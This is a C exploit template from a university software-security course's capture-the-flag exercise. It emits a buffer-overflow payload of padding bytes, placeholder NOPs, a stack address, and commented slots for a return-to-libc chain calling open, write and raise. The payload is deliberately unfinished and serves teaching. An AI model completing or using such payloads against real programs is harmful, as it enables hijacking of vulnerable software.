/*
 * CTF-2 `vcat3' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>

unsigned char payload[] =
	/* ------------------------------------	*/
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	"XXXXXXXXXXXX"
	/* ------------------------------------	*/
	/* FIXME */
	/* ------------------------------------	*/
	"\x90\x90\x90\x90" //<open>
	"\x90\x90\x90\x90"  //<return>
	"\x2c\xc3\xff\xbf"; //<first param>
						//<second param>
						//<third param>
						//<write>
						//<return>
						//<first param>
						//<second param>
						//<third param>
						//<raise>
						//<first param>


	/* ------------------------------------	*/


int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
